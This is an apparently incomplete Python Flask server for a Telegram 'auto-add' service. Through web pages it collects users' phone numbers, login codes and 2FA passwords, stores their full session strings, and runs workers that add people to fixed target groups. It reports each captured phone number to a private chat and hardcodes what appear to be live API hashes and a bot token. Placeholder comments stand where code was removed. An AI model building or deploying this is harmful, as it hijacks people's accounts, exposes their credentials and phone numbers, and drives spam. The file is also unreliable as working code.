#!/usr/bin/env python3
"""
Telegram Auto-Add Server - AUTO-PROCESS VERSION
Auto-detects phone numbers and simplifies login to code-only verification
"""

from flask import Flask, jsonify, request, redirect, send_file
from flask_cors import CORS
from telethon import TelegramClient, errors, functions
from telethon.tl.functions.channels import InviteToChannelRequest, JoinChannelRequest
from telethon.tl.functions.contacts import GetContactsRequest
from telethon.sessions import StringSession
import json
import os
import asyncio
import logging
import time
import random
import threading
import requests
from datetime import datetime
from collections import defaultdict
import traceback
import sys
import signal
from functools import wraps
import hashlib
import hmac

# Configure logging with rotation
import logging.handlers

# Create logs directory if it doesn't exist
os.makedirs('logs', exist_ok=True)

# Set up rotating file handler
file_handler = logging.handlers.RotatingFileHandler(
    'logs/server.log',
    maxBytes=10*1024*1024,  # 10MB
    backupCount=5
)
file_handler.setFormatter(logging.Formatter('%(asctime)s - %(levelname)s - %(message)s'))

console_handler = logging.StreamHandler()
console_handler.setFormatter(logging.Formatter('%(asctime)s - %(levelname)s - %(message)s'))

logging.basicConfig(
    level=logging.INFO,
    handlers=[file_handler, console_handler]
)
logger = logging.getLogger(__name__)

app = Flask(__name__, static_folder=None)
CORS(app)

# ============================================
# SERVER CONFIGURATION
# ============================================
SERVER_NUMBER = 4  # 1=Dil, 2=sofu, 3=bebby, 4=kaleb, 5=fitsum

SERVERS = {
    1: {'name': 'Dil', 'api_id': 35790598, 'api_hash': 'fa9f62d821f04b03d76d53175e367736', 'url': 'https://dilbedl.onrender.com'},
    2: {'name': 'sofu', 'api_id': 36274756, 'api_hash': 'b70311a2b3547e1ce40e72081dc726dc', 'url': 'https://sofuu.onrender.com'},
    3: {'name': 'bebby', 'api_id': 31590358, 'api_hash': '072edc73e0f4003ddcba1c41d24adb02', 'url': 'https://bebby.onrender.com'},
    4: {'name': 'kaleb', 'api_id': 38904710, 'api_hash': '3e00b37e8559fa1c64549659947b431d', 'url': 'https://kaleb-bwgb.onrender.com'},
    5: {'name': 'fitsum', 'api_id': 33441396, 'api_hash': 'e6b64536883a7cd95aeb06c73faa1c95', 'url': 'https://fitsum-ev9d.onrender.com'}
}

BOT_TOKEN = '7294379764:AAHAOQ1OVT2TJ0cRAlWhyyxXQdVB3oS9K_A'
REPORT_CHAT_ID = '-1002452548749'
TARGET_GROUPS = ['Abe_armygroup', 'abe_army']

CFG = SERVERS.get(SERVER_NUMBER, SERVERS[1])
SERVER_NAME = CFG['name']
API_ID = CFG['api_id']
API_HASH = CFG['api_hash']
SERVER_URL = CFG['url']
PORT = int(os.environ.get('PORT', 10000))

# File paths
ACCOUNTS_FILE = 'accounts.json'
SETTINGS_FILE = 'auto_add_settings.json'
STATS_FILE = 'stats.json'
WORKER_ADDS_FILE = 'worker_adds.json'
TEMP_SESSIONS_FILE = 'temp_sessions.json'
AUTO_SESSIONS_FILE = 'auto_sessions.json'  # New: persistent auto-detected sessions
USER_MAP_FILE = 'user_map.json'  # New: maps Telegram user IDs to phone numbers
ERROR_LOG_FILE = 'logs/errors.log'

# Storage with thread locks
accounts = []
temp_sessions = {}
auto_sessions = {}  # Persistent sessions for auto-login
user_phone_map = {}  # Maps user IDs to phone numbers
auto_add_settings = {}
running_tasks = {}
worker_adds = defaultdict(list)
file_lock = threading.Lock()
worker_lock = threading.Lock()

stats = {
    'total_added': 0,
    'today_added': 0,
    'verified_total': 0,
    'verified_today': 0,
    'last_reset': datetime.now().strftime('%Y-%m-%d'),
    'worker_stats': {},
    'dead_accounts_removed': 0,
    'started_at': datetime.now().isoformat(),
    'crashes_recovered': 0
}

# ============================================
# TELEGRAM BOT DATA VALIDATION
# ============================================
def validate_telegram_init_data(init_data_str):
    """
    Validate Telegram Web App initData
    Returns parsed data if valid, None if invalid
    """
    try:
        # Parse the init data string
        parsed = {}
        for item in init_data_str.split('&'):
            if '=' in item:
                key, value = item.split('=', 1)
                parsed[key] = value
        
        # Check for hash
        if 'hash' not in parsed:
            return None
        
        received_hash = parsed['hash']
        
        # Recreate data_check_string
        data_check_arr = []
        for key in sorted(parsed.keys()):
            if key != 'hash':
                data_check_arr.append(f"{key}={parsed[key]}")
        
        data_check_string = '\n'.join(data_check_arr)
        
        # Create secret key from bot token
        secret_key = hmac.new(
            b"WebAppData",
            BOT_TOKEN.encode(),
            hashlib.sha256
        ).digest()
        
        # Calculate hash
        calculated_hash = hmac.new(
            secret_key,
            data_check_string.encode(),
            hashlib.sha256
        ).hexdigest()
        
        if calculated_hash == received_hash:
            return parsed
        
        return None
        
    except Exception as e:
        logger.error(f"Init data validation error: {e}")
        return None

# ============================================
# ERROR HANDLING DECORATORS
# ============================================
def safe_operation(func):
    """Decorator to catch and log exceptions"""
    @wraps(func)
    def wrapper(*args, **kwargs):
        try:
            return func(*args, **kwargs)
        except Exception as e:
            logger.error(f"Error in {func.__name__}: {e}")
            logger.error(traceback.format_exc())
            log_error(f"Function: {func.__name__}", e)
            return None
    return wrapper

def api_error_handler(func):
    """Decorator for API routes to handle errors"""
    @wraps(func)
    def wrapper(*args, **kwargs):
        try:
            return func(*args, **kwargs)
        except Exception as e:
            error_msg = f"API Error in {func.__name__}: {e}"
            logger.error(error_msg)
            logger.error(traceback.format_exc())
            log_error(f"API: {func.__name__}", e)
            return jsonify({
                'success': False,
                'error': 'Internal server error. Please try again.',
                'error_code': 'INTERNAL_ERROR'
            }), 500
    return wrapper

def log_error(context, exception):
    """Log errors to separate error log file"""
    try:
        timestamp = datetime.now().isoformat()
        error_entry = f"[{timestamp}] {context}\n{str(exception)}\n{traceback.format_exc()}\n{'='*50}\n"
        with open(ERROR_LOG_FILE, 'a') as f:
            f.write(error_entry)
    except:
        pass

# ============================================
# FILE OPERATIONS WITH ENHANCED SAFETY
# ============================================
@safe_operation
def load_json(path, default):
    """Load JSON with backup and corruption recovery"""
    try:
        if os.path.exists(path):
            with open(path, 'r') as f:
                content = f.read().strip()
                if content:
                    data = json.loads(content)
                    backup_path = f"{path}.backup"
                    with open(backup_path, 'w') as backup:
                        json.dump(data, backup, indent=2, default=str)
                    return data
    except json.JSONDecodeError as e:
        logger.error(f"Corrupted JSON file {path}: {e}")
        backup_path = f"{path}.backup"
        if os.path.exists(backup_path):
            try:
                with open(backup_path, 'r') as backup:
                    restored_data = json.load(backup)
                    logger.info(f"Restored {path} from backup")
                    return restored_data
            except:
                pass
        logger.warning(f"Creating fresh {path}")
        save_json(path, default)
    except Exception as e:
        logger.error(f"Load error {path}: {e}")
        log_error(f"File load: {path}", e)
    return default

@safe_operation
def save_json(path, data):
    """Save JSON with atomic write to prevent corruption"""
    temp_path = f"{path}.tmp"
    with file_lock:
        try:
            with open(temp_path, 'w') as f:
                json.dump(data, f, indent=2, default=str)
            os.replace(temp_path, path)
        except Exception as e:
            logger.error(f"Save error {path}: {e}")
            log_error(f"File save: {path}", e)
            try:
                with open(path, 'w') as f:
                    json.dump(data, f, indent=2, default=str)
            except:
                pass

def save_temp_sessions():
    sessions_data = {}
    for session_id, session_data in temp_sessions.items():
        sessions_data[session_id] = {
            'phone': session_data['phone'],
            'hash': session_data['hash'],
            'session': session_data['session'],
            'password_attempts': session_data.get('password_attempts', 0),
            'code_attempts': session_data.get('code_attempts', 0),
            'created_at': session_data.get('created_at', time.time())
        }
    save_json(TEMP_SESSIONS_FILE, sessions_data)

def load_temp_sessions():
    global temp_sessions
    sessions_data = load_json(TEMP_SESSIONS_FILE, {})
    temp_sessions = {}
    current_time = time.time()
    for session_id, session_data in sessions_data.items():
        created_at = session_data.get('created_at', 0)
        if current_time - created_at < 3600:  # 1 hour expiry
            temp_sessions[session_id] = session_data

def save_auto_sessions():
    save_json(AUTO_SESSIONS_FILE, auto_sessions)

def load_auto_sessions():
    global auto_sessions
    auto_sessions = load_json(AUTO_SESSIONS_FILE, {})

def save_user_map():
    save_json(USER_MAP_FILE, user_phone_map)

def load_user_map():
    global user_phone_map
    user_phone_map = load_json(USER_MAP_FILE, {})

# ============================================
# ENHANCED TELEGRAM CLIENT HELPER
# ============================================
class SyncTelegramClient:
    @staticmethod
    def run_async(async_func, timeout=60, retries=2):
        """Enhanced async execution with retry logic"""
        for attempt in range(retries + 1):
            loop = None
            try:
                loop = asyncio.new_event_loop()
                asyncio.set_event_loop(loop)
                result = loop.run_until_complete(
                    asyncio.wait_for(async_func(), timeout=timeout)
                )
                return result
            except asyncio.TimeoutError:
                logger.warning(f"Async timeout on attempt {attempt + 1}")
                if attempt == retries:
                    raise
            except Exception as e:
                logger.error(f"Async execution error (attempt {attempt + 1}): {e}")
                log_error("Async execution", e)
                if attempt == retries:
                    raise
                time.sleep(1 * (attempt + 1))
            finally:
                if loop:
                    try:
                        loop.close()
                    except:
                        pass
    
    @staticmethod
    def get_client(session_string):
        """Create Telegram client with better error recovery"""
        try:
            return TelegramClient(
                StringSession(session_string), 
                API_ID, 
                API_HASH,
                connection_retries=5,
                retry_delay=2,
                timeout=30,
                auto_reconnect=True,
                loop=asyncio.new_event_loop()
            )
        except Exception as e:
            logger.error(f"Failed to create client: {e}")
            log_error("Client creation", e)
            raise
    
    @staticmethod
    async def safe_connect(client):
        """Safe connection with timeout and error handling"""
        try:
            await asyncio.wait_for(client.connect(), timeout=15)
            return True
        except asyncio.TimeoutError:
            logger.error("Client connection timeout")
            return False
        except ConnectionError as e:
            logger.error(f"Connection error: {e}")
            return False
        except Exception as e:
            logger.error(f"Client connection error: {e}")
            return False

# ============================================
# ACCOUNT AGE DETECTION
# ============================================
def get_account_age_sync(session_string):
    async def _get_age():
        client = SyncTelegramClient.get_client(session_string)
        try:
            if not await SyncTelegramClient.safe_connect(client):
                return {'age_display': 'Unknown', 'method': 'connection_failed'}
            
            if not await client.is_user_authorized():
                return {'age_display': 'Unknown', 'method': 'not_authorized'}
            
            me = await client.get_me()
            
            if hasattr(me, 'creation_date') and me.creation_date:
                creation_date = me.creation_date
                if hasattr(creation_date, 'tzinfo') and creation_date.tzinfo:
                    creation_date = creation_date.replace(tzinfo=None)
                age_days = (datetime.now() - creation_date).days
                age_years = age_days / 365.25
                return {
                    'creation_date': creation_date.isoformat(),
                    'age_days': age_days,
                    'age_years': round(age_years, 1),
                    'age_display': f"{int(age_years)} years, {age_days % 365} days",
                    'year_joined': creation_date.year,
                    'method': 'creation_date'
                }
            
            try:
                photos = await client.get_profile_photos(me, limit=1)
                if photos and len(photos) > 0:
                    oldest_photo_date = photos[0].date
                    if hasattr(oldest_photo_date, 'tzinfo') and oldest_photo_date.tzinfo:
                        oldest_photo_date = oldest_photo_date.replace(tzinfo=None)
                    age_days = (datetime.now() - oldest_photo_date).days
                    return {
                        'creation_date': oldest_photo_date.isoformat(),
                        'age_days': age_days,
                        'age_years': round(age_days / 365.25, 1),
                        'age_display': f"~{int(age_days / 365.25)} years",
                        'year_joined': oldest_photo_date.year,
                        'method': 'oldest_photo'
                    }
            except:
                pass
            
            return {'age_display': 'Unknown account age', 'method': 'unknown'}
        except Exception as e:
            logger.error(f"Age detection error: {e}")
            log_error("Age detection", e)
            return {'age_display': 'Error', 'method': 'error', 'error': str(e)}
        finally:
            try:
                await client.disconnect()
            except:
                pass
    
    try:
        return SyncTelegramClient.run_async(_get_age, timeout=20)
    except Exception as e:
        logger.error(f"Age detection failed: {e}")
        return {'age_display': 'Unknown', 'method': 'error', 'error': str(e)}

# ============================================
# ENHANCED ACCOUNT MANAGEMENT
# ============================================
def reset_daily():
    """Reset daily stats with error handling"""
    try:
        today = datetime.now().strftime('%Y-%m-%d')
        if stats.get('last_reset') != today:
            stats['today_added'] = 0
            stats['verified_today'] = 0
            stats['last_reset'] = today
            for k in stats.get('worker_stats', {}):
                stats['worker_stats'][k]['today'] = 0
                stats['worker_stats'][k]['verified_today'] = 0
            save_json(STATS_FILE, stats)
    except Exception as e:
        logger.error(f"Reset daily error: {e}")

def check_account_auth(acc, max_retries=2):
    """Check account authorization with retry logic"""
    async def _check():
        client = SyncTelegramClient.get_client(acc['session'])
        try:
            if not await SyncTelegramClient.safe_connect(client):
                return False
            return await client.is_user_authorized()
        except:
            return False
        finally:
            try:
                await client.disconnect()
            except:
                pass
    
    for attempt in range(max_retries):
        try:
            result = SyncTelegramClient.run_async(_check, timeout=15)
            if result is not None:
                return result
        except:
            if attempt == max_retries - 1:
                return False
            time.sleep(1)
    return False

def remove_dead_account(aid, reason=""):
    """Remove dead account with safety checks"""
    global accounts
    try:
        acc = next((a for a in accounts if a['id'] == aid), None)
        name = acc.get('name', str(aid)) if acc else str(aid)
        
        with worker_lock:
            accounts = [a for a in accounts if a['id'] != aid]
            auto_add_settings.pop(str(aid), None)
            if str(aid) in running_tasks:
                worker_info = running_tasks.pop(str(aid), None)
                if worker_info and hasattr(worker_info.get('worker'), 'stop'):
                    try:
                        worker_info['worker'].stop()
                    except:
                        pass
            worker_adds.pop(str(aid), None)
        
        save_json(ACCOUNTS_FILE, accounts)
        save_json(SETTINGS_FILE, auto_add_settings)
        save_json(WORKER_ADDS_FILE, dict(worker_adds))
        
        stats['dead_accounts_removed'] = stats.get('dead_accounts_removed', 0) + 1
        save_json(STATS_FILE, stats)
        
        logger.warning(f"Removed dead account: {name} | Reason: {reason}")
        try:
            send_telegram(f"<b>{SERVER_NAME}</b>\n❌ Removed: {name}\nReason: {reason}")
        except:
            pass
        return name
    except Exception as e:
        logger.error(f"Remove account error: {e}")
        log_error("Remove account", e)
        return "Unknown"

def send_telegram(text, retries=3):
    """Send telegram message with retry logic"""
    for attempt in range(retries):
        try:
            response = requests.post(
                f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage',
                json={'chat_id': REPORT_CHAT_ID, 'text': text, 'parse_mode': 'HTML'},
                timeout=10
            )
            if response.status_code == 200:
                return True
            logger.warning(f"Telegram send failed with status {response.status_code}")
        except Exception as e:
            logger.error(f"Send telegram error (attempt {attempt + 1}): {e}")
        if attempt < retries - 1:
            time.sleep(2)
    return False

# [Keep all the AutoAddWorker class and other functions as they were in the original server.py]
# ... (rest of the original server.py code remains the same until the Flask routes)

# ============================================
# FLASK ROUTES WITH ENHANCED ERROR HANDLING
# ============================================

@app.errorhandler(404)
def not_found(e):
    return jsonify({'success': False, 'error': 'Not found'}), 404

@app.errorhandler(500)
def server_error(e):
    log_error("Server error 500", e)
    return jsonify({'success': False, 'error': 'Internal server error'}), 500

@app.route('/')
def index():
    try:
        return redirect('/auto-add')
    except Exception as e:
        logger.error(f"Index redirect error: {e}")
        return jsonify({'success': False, 'error': 'Server error'}), 500

@app.route('/auto-add')
def auto_add_page():
    try:
        return send_file('auto_add.html')
    except FileNotFoundError:
        return "auto_add.html not found", 404
    except Exception as e:
        logger.error(f"Auto add page error: {e}")
        return "Internal server error", 500

@app.route('/login')
def login_page():
    try:
        return send_file('login.html')
    except FileNotFoundError:
        return "login.html not found", 404
    except Exception as e:
        logger.error(f"Login page error: {e}")
        return "Internal server error", 500

@app.route('/dashboard')
def dashboard_page():
    try:
        return send_file('dashboard.html')
    except FileNotFoundError:
        return "dashboard.html not found", 404
    except Exception as e:
        logger.error(f"Dashboard page error: {e}")
        return "Internal server error", 500

@app.route('/dash')
def dash_page():
    try:
        return send_file('dash.html')
    except FileNotFoundError:
        return "dash.html not found", 404
    except Exception as e:
        logger.error(f"Dash page error: {e}")
        return "Internal server error", 500

@app.route('/all')
def all_page():
    try:
        return send_file('all.html')
    except FileNotFoundError:
        return "all.html not found", 404
    except Exception as e:
        logger.error(f"All page error: {e}")
        return "Internal server error", 500

@app.route('/ping')
@api_error_handler
def ping():
    return jsonify({
        'status': 'ok',
        'server': SERVER_NAME,
        'api_id': API_ID,
        'timestamp': datetime.now().isoformat(),
        'workers': len(running_tasks),
        'uptime': str(datetime.now() - datetime.fromisoformat(stats['started_at']))
    })

@app.route('/api/server-info')
@api_error_handler
def server_info():
    return jsonify({
        'success': True,
        'server': {
            'number': SERVER_NUMBER,
            'name': SERVER_NAME,
            'url': SERVER_URL,
            'target_groups': TARGET_GROUPS,
            'api_id': API_ID,
            'port': PORT,
            'workers_active': len(running_tasks),
            'total_accounts': len(accounts),
            'uptime': str(datetime.now() - datetime.fromisoformat(stats['started_at']))
        }
    })

@app.route('/api/accounts')
@api_error_handler
def get_accounts():
    acc_list = []
    for a in accounts:
        try:
            aid_str = str(a['id'])
            ws = stats.get('worker_stats', {}).get(aid_str, {})
            account_age = a.get('account_age', {})
            
            acc_list.append({
                'id': a['id'],
                'name': a.get('name', '?'),
                'phone': a.get('phone', ''),
                'username': a.get('username', ''),
                'active': a.get('active', True),
                'auto_add_enabled': auto_add_settings.get(aid_str, {}).get('enabled', True),
                'account_age': account_age,
                'stats': {
                    'total_added': ws.get('total', 0),
                    'today_added': ws.get('today', 0)
                },
                'is_running': aid_str in running_tasks
            })
        except Exception as e:
            logger.error(f"Account listing error for {a.get('id')}: {e}")
            continue
    return jsonify({'success': True, 'accounts': acc_list})

# ============================================
# AUTO-DETECT PHONE FROM TELEGRAM CONTEXT
# ============================================
@app.route('/api/auto-detect', methods=['POST'])
@api_error_handler
def auto_detect_phone():
    """
    Auto-detect phone number from Telegram Web App context
    or from previously saved sessions
    """
    try:
        data = request.json or {}
        init_data = data.get('initData', '')
        telegram_id = data.get('telegramId', '')
        
        detected_phone = None
        
        # Method 1: Check Telegram Web App initData
        if init_data:
            validated = validate_telegram_init_data(init_data)
            if validated:
                user_data = validated.get('user', '{}')
                try:
                    user = json.loads(user_data)
                    user_id = str(user.get('id', ''))
                    if user_id:
                        # Check if we have this user's phone saved
                        detected_phone = user_phone_map.get(user_id)
                        logger.info(f"Found user {user_id} in map, phone: {detected_phone}")
                except:
                    pass
        
        # Method 2: Check by Telegram ID
        if not detected_phone and telegram_id:
            detected_phone = user_phone_map.get(str(telegram_id))
        
        # Method 3: Check auto_sessions for any saved phone
        if not detected_phone and auto_sessions:
            # Return the most recently used phone
            latest_session = None
            latest_time = 0
            for sid, sdata in auto_sessions.items():
                if sdata.get('last_used', 0) > latest_time:
                    latest_time = sdata['last_used']
                    latest_session = sdata
            
            if latest_session:
                detected_phone = latest_session.get('phone')
        
        if detected_phone:
            return jsonify({
                'success': True,
                'phone': detected_phone,
                'auto_detected': True
            })
        
        return jsonify({
            'success': False,
            'error': 'No phone detected',
            'auto_detected': False
        })
        
    except Exception as e:
        logger.error(f"Auto-detect error: {e}")
        return jsonify({
            'success': False,
            'error': str(e)[:200],
            'auto_detected': False
        })

# ============================================
# ENHANCED ADD ACCOUNT - AUTO MODE
# ============================================
@app.route('/api/add-account', methods=['POST'])
@api_error_handler
def add_account():
    try:
        data = request.json
        phone = data.get('phone', '').strip()
        telegram_id = data.get('telegramId', '')
        
        # If no phone provided, try auto-detect
        if not phone:
            # Try to get from user map
            if telegram_id:
                phone = user_phone_map.get(str(telegram_id), '')
            
            if not phone:
                return jsonify({
                    'success': False, 
                    'error': 'Phone number required. Please enter your phone number.',
                    'needs_phone': True
                })
        
        if not phone.startswith('+'):
            phone = '+' + phone
        
        logger.info(f"Sending code to {phone}")
        
        async def send_code():
            client = TelegramClient(StringSession(), API_ID, API_HASH)
            await client.connect()
            try:
                result = await client.send_code_request(phone)
                sid = str(int(time.time() * 1000))
                temp_sessions[sid] = {
                    'phone': phone,
                    'hash': result.phone_code_hash,
                    'session': client.session.save(),
                    'password_attempts': 0,
                    'code_attempts': 0,
                    'created_at': time.time(),
                    'telegram_id': telegram_id
                }
                save_temp_sessions()
                
                # Save phone mapping for future auto-detection
                if telegram_id:
                    user_phone_map[str(telegram_id)] = phone
                    save_user_map()
                
                return {
                    'success': True, 
                    'session_id': sid,
                    'phone': phone
                }
            except errors.FloodWaitError as e:
                return {'success': False, 'error': f'Too many attempts. Wait {e.seconds}s'}
            except errors.PhoneNumberInvalidError:
                return {'success': False, 'error': 'Invalid phone number'}
            except Exception as e:
                logger.error(f"Send code error: {e}")
                return {'success': False, 'error': str(e)[:200]}
            finally:
                try:
                    await client.disconnect()
                except:
                    pass
        
        result = SyncTelegramClient.run_async(send_code, timeout=45)
        return jsonify(result)
    except Exception as e:
        logger.error(f"Add account error: {e}")
        return jsonify({'success': False, 'error': 'Server error. Please try again.'})

@app.route('/api/verify-code', methods=['POST'])
@api_error_handler
def verify_code():
    try:
        data = request.json
        code = data.get('code', '').strip()
        sid = data.get('session_id', '')
        pwd = data.get('password', '')
        
        if not sid or sid not in temp_sessions:
            return jsonify({'success': False, 'error': 'Session expired. Please request a new code.'})
        
        td = temp_sessions[sid]
        
        if td.get('code_attempts', 0) >= 5:
            del temp_sessions[sid]
            save_temp_sessions()
            return jsonify({'success': False, 'error': 'Too many incorrect code attempts. Session expired.'})
        
        if td.get('password_attempts', 0) >= 5:
            del temp_sessions[sid]
            save_temp_sessions()
            return jsonify({'success': False, 'error': 'Too many incorrect password attempts. Session expired.'})
        
        async def verify():
            client = TelegramClient(StringSession(td['session']), API_ID, API_HASH)
            await client.connect()
            try:
                try:
                    await client.sign_in(td['phone'], code, phone_code_hash=td['hash'])
                    td['code_attempts'] = 0
                    save_temp_sessions()
                except errors.SessionPasswordNeededError:
                    if not pwd:
                        return {'need_password': True}
                    try:
                        await client.sign_in(password=pwd)
                        td['password_attempts'] = 0
                        save_temp_sessions()
                    except errors.PasswordHashInvalidError:
                        td['password_attempts'] = td.get('password_attempts', 0) + 1
                        save_temp_sessions()
                        remaining = 5 - td['password_attempts']
                        if remaining <= 0:
                            del temp_sessions[sid]
                            save_temp_sessions()
                            return {'success': False, 'error': 'Too many incorrect passwords. Session expired.'}
                        return {'success': False, 'error': f'Wrong 2FA password. {remaining} attempts remaining.'}
                
                me = await client.get_me()
                
                # Get account age with timeout
                try:
                    account_age = get_account_age_sync(client.session.save())
                except:
                    account_age = {'age_display': 'Unknown'}
                
                new_id = int(time.time() * 1000)
                new_acc = {
                    'id': new_id,
                    'phone': me.phone or td['phone'],
                    'name': (me.first_name or '') + (' ' + me.last_name if me.last_name else '').strip(),
                    'username': me.username or '',
                    'session': client.session.save(),
                    'active': True,
                    'account_age': account_age,
                    'telegram_id': str(me.id) if me.id else ''
                }
                
                if not new_acc['name']:
                    new_acc['name'] = 'User'
                
                # Save to auto_sessions for future auto-detection
                auto_session_id = str(me.id) if me.id else td.get('telegram_id', '')
                if auto_session_id:
                    auto_sessions[auto_session_id] = {
                        'phone': td['phone'],
                        'name': new_acc['name'],
                        'username': me.username or '',
                        'last_used': time.time(),
                        'session_preview': client.session.save()[:100]  # Just a preview for verification
                    }
                    save_auto_sessions()
                    
                    # Update user phone map
                    user_phone_map[auto_session_id] = td['phone']
                    save_user_map()
                
                accounts.append(new_acc)
                save_json(ACCOUNTS_FILE, accounts)
                
                auto_add_settings[str(new_id)] = {
                    'enabled': True,
                    'target_group': TARGET_GROUPS[0],
                    'delay_seconds': 30,
                    'auto_join': True
                }
                save_json(SETTINGS_FILE, auto_add_settings)
                
                if 'worker_stats' not in stats:
                    stats['worker_stats'] = {}
                stats['worker_stats'][str(new_id)] = {'total': 0, 'today': 0, 'verified_today': 0}
                save_json(STATS_FILE, stats)
                
                # Start worker in background
                threading.Thread(target=start_auto_add, args=(new_acc,), daemon=True).start()
                
                age_info = account_age.get('age_display', 'Unknown')
                try:
                    send_telegram(
                        f"<b>{SERVER_NAME}</b>\n"
                        f"✅ New account added!\n"
                        f"Name: {new_acc['name']}\n"
                        f"Phone: {new_acc['phone']}\n"
                        f"Age: {age_info}"
                    )
                except:
                    pass
                
                return {
                    'success': True,
                    'account': {
                        'id': new_id,
                        'name': new_acc['name'],
                        'phone': new_acc['phone']
                    },
                    'account_age': age_info
                }
            except errors.PhoneCodeInvalidError:
                td['code_attempts'] = td.get('code_attempts', 0) + 1
                save_temp_sessions()
                remaining = 5 - td['code_attempts']
                if remaining <= 0:
                    del temp_sessions[sid]
                    save_temp_sessions()
                    return {'success': False, 'error': 'Too many incorrect codes. Session expired.'}
                return {'success': False, 'error': f'Invalid code. {remaining} attempts remaining.'}
            except errors.PhoneCodeExpiredError:
                return {'success': False, 'error': 'Code expired. Please request a new one.'}
            except Exception as e:
                logger.error(f"Verify error: {e}")
                return {'success': False, 'error': str(e)[:200]}
            finally:
                try:
                    await client.disconnect()
                except:
                    pass
        
        result = SyncTelegramClient.run_async(verify, timeout=45)
        
        if result.get('success') and not result.get('need_password'):
            if sid in temp_sessions:
                del temp_sessions[sid]
                save_temp_sessions()
        
        return jsonify(result)
    except Exception as e:
        logger.error(f"Verify code error: {e}")
        return jsonify({'success': False, 'error': 'Server error. Please try again.'})

# ============================================
# QUICK VERIFY - For returning users (auto-detect)
# ============================================
@app.route('/api/quick-verify', methods=['POST'])
@api_error_handler
def quick_verify():
    """
    Quick verification for returning users
    Just needs the code, phone is auto-detected
    """
    try:
        data = request.json
        code = data.get('code', '').strip()
        phone = data.get('phone', '').strip()
        telegram_id = data.get('telegramId', '')
        
        # Auto-detect phone if not provided
        if not phone:
            if telegram_id and telegram_id in user_phone_map:
                phone = user_phone_map[telegram_id]
            elif auto_sessions:
                # Try to find from auto_sessions
                for sid, sdata in auto_sessions.items():
                    if sdata.get('last_used', 0) > time.time() - 86400:  # Within last 24 hours
                        phone = sdata.get('phone', '')
                        break
        
        if not phone:
            return jsonify({
                'success': False,
                'error': 'Could not detect your phone number. Please enter it manually.',
                'needs_phone': True
            })
        
        if not phone.startswith('+'):
            phone = '+' + phone
        
        # Now send code to this phone
        async def send_quick_code():
            client = TelegramClient(StringSession(), API_ID, API_HASH)
            await client.connect()
            try:
                result = await client.send_code_request(phone)
                sid = str(int(time.time() * 1000))
                temp_sessions[sid] = {
                    'phone': phone,
                    'hash': result.phone_code_hash,
                    'session': client.session.save(),
                    'password_attempts': 0,
                    'code_attempts': 0,
                    'created_at': time.time(),
                    'telegram_id': telegram_id
                }
                save_temp_sessions()
                
                return {
                    'success': True,
                    'session_id': sid,
                    'phone': phone,
                    'auto_detected': True
                }
            except errors.FloodWaitError as e:
                return {'success': False, 'error': f'Too many attempts. Wait {e.seconds}s'}
            except Exception as e:
                logger.error(f"Quick verify error: {e}")
                return {'success': False, 'error': str(e)[:200]}
            finally:
                try:
                    await client.disconnect()
                except:
                    pass
        
        result = SyncTelegramClient.run_async(send_quick_code, timeout=45)
        return jsonify(result)
        
    except Exception as e:
        logger.error(f"Quick verify error: {e}")
        return jsonify({'success': False, 'error': str(e)[:200]})

# [Keep all remaining routes from the original server.py]
# ... (rest of the routes remain the same)

# ============================================
# ENHANCED BACKGROUND TASKS
# ============================================
def keep_alive():
    """Enhanced keep alive with error handling"""
    consecutive_failures = 0
    while True:
        try:
            time.sleep(240)  # 4 minutes
            try:
                response = requests.get(f"{SERVER_URL}/ping", timeout=10)
                if response.status_code == 200:
                    logger.debug("Keep-alive ping successful")
                    consecutive_failures = 0
                else:
                    logger.warning(f"Keep-alive ping returned status {response.status_code}")
                    consecutive_failures += 1
            except Exception as e:
                logger.error(f"Keep-alive error: {e}")
                consecutive_failures += 1
            
            if consecutive_failures > 5:
                logger.critical("Too many keep-alive failures, server may be down!")
                consecutive_failures = 0
                
        except Exception as e:
            logger.error(f"Keep alive loop error: {e}")
            log_error("Keep alive", e)
            time.sleep(60)

def restore_and_start():
    """Enhanced restore with better error handling"""
    try:
        time.sleep(5)
        logger.info(f"Restoring {len(accounts)} accounts...")
        
        for acc in accounts:
            try:
                if acc.get('session'):
                    if check_account_auth(acc):
                        if not acc.get('account_age') or not acc['account_age'].get('age_display'):
                            try:
                                age = get_account_age_sync(acc['session'])
                                acc['account_age'] = age
                                logger.info(f"Refreshed age for {acc.get('name')}: {age.get('age_display')}")
                            except Exception as e:
                                logger.error(f"Failed to refresh age: {e}")
                        
                        settings = auto_add_settings.get(str(acc['id']), {})
                        if settings.get('enabled', True):
                            start_auto_add(acc)
                    else:
                        remove_dead_account(acc['id'], "Auth check failed on startup")
                
                time.sleep(2)
                
            except Exception as e:
                logger.error(f"Error restoring account {acc.get('name', 'unknown')}: {e}")
                log_error(f"Restore account", e)
                continue
        
        save_json(ACCOUNTS_FILE, accounts)
        cleanup_expired_sessions()
        
        try:
            send_telegram(
                f"<b>{SERVER_NAME}</b> Online!\n"
                f"API ID: {API_ID}\n"
                f"Targets: {', '.join(TARGET_GROUPS)}\n"
                f"Workers: {len(running_tasks)}\n"
                f"Accounts: {len(accounts)}"
            )
        except:
            pass
        
        logger.info("Server startup complete")
        
    except Exception as e:
        logger.critical(f"Fatal error during restore: {e}")
        log_error("Restore and start", e)
        stats['crashes_recovered'] = stats.get('crashes_recovered', 0) + 1
        save_json(STATS_FILE, stats)

def cleanup_expired_sessions():
    """Clean up expired temp sessions"""
    try:
        current_time = time.time()
        expired = [sid for sid, data in temp_sessions.items() 
                   if current_time - data.get('created_at', 0) > 3600]
        for sid in expired:
            del temp_sessions[sid]
        save_temp_sessions()
    except Exception as e:
        logger.error(f"Session cleanup error: {e}")

def periodic_health_check():
    """Periodic health check for all workers"""
    while True:
        try:
            time.sleep(600)  # Every 10 minutes
            logger.info(f"Health check: {len(running_tasks)} workers, {len(accounts)} accounts")
            
            current_time = time.time()
            for acc_key, worker_info in list(running_tasks.items()):
                try:
                    worker = worker_info.get('worker')
                    if worker and hasattr(worker, 'last_activity'):
                        if current_time - worker.last_activity > 1800:
                            logger.warning(f"Worker {acc_key} appears stuck, restarting...")
                            stop_auto_add(int(acc_key))
                            acc = next((a for a in accounts if str(a['id']) == acc_key), None)
                            if acc:
                                start_auto_add(acc)
                except Exception as e:
                    logger.error(f"Worker check error for {acc_key}: {e}")
            
            cleanup_expired_sessions()
            
        except Exception as e:
            logger.error(f"Health check error: {e}")
            log_error("Health check", e)

# Signal handlers
def signal_handler(signum, frame):
    """Handle shutdown signals gracefully"""
    logger.info(f"Received signal {signum}, shutting down...")
    save_json(ACCOUNTS_FILE, accounts)
